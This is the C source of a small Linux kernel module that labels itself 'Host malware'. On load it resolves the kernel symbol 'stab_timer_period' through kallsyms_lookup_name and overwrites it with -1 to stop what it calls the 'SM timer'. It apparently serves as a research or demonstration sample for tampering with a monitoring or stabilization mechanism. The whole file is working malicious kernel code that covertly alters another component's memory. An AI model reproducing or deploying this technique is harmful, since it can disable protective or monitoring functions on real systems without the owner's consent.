#undef __KERNEL__
#define __KERNEL__

#undef MODULE
#define MODULE

#include <linux/version.h>
#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>        // included for __init and __exit macros
#include <linux/timer.h>
#include <linux/jiffies.h>
#include <linux/async.h>
#include <linux/string.h>
#include <linux/kallsyms.h>
MODULE_LICENSE("GPL");

static struct timer_list* f;
char *data;

static int __init del_init(void)
{
	printk(KERN_INFO "!!!!!!!!! Host malware initializing\n");
	f=NULL;
	data=(char*)kallsyms_lookup_name("stab_timer_period");
    if (data == NULL)
    {
    	printk(KERN_INFO "Stabilization timer data not found");
    }
    else
    {
	    //del_timer(f);
    	*((int*)data) = -1; // stopping SM timer
	    printk(KERN_INFO "!!!!!! Malware finished: SM timer stopped");
	}
    return 0;
}

static void __exit del_exit(void)
{
    printk(KERN_INFO "Cleaning up module.\n");
}

module_init(del_init);
module_exit(del_exit);
